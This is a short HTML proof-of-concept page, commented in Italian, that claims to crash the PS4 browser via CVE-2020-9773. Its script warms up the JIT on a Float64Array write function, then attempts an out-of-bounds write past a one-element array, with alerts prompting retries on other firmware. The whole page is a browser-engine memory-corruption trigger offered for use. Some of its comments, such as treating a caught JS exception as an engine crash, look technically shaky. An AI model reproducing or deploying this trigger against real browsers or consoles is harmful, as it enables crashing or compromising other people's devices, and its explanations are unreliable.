<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>PS4 Crash PoC (CVE-2020-9773)</title>
</head>
<body>
  <h1>Crash PoC per CVE-2020-9773</h1>
  <script>
    // 1) Warm-up del JIT su Float64Array
    function jit(o, idx, v) {
      o[idx] = v;
    }
    for (let i = 0; i < 10000; i++) {
      jit(new Float64Array(1), 0, 1.1);
    }

    // 2) Trigger OOB write
    let victim = new Float64Array(1);
    try {
      // L’indice 1 è fuori dai limiti: scrive oltre l’header
      jit(victim, 1, 13.37);
      // Se non crasha, proviamo a leggere
      console.log("Dopo OOB: ", victim[0]);
      alert("Non crashato—riprovare o firmware diverso");
    } catch (e) {
      // Se entra qui, probabilmente un crash silenzioso del motore
      alert("Eccezione JS: " + e);
    }
  </script>
</body>
</html>
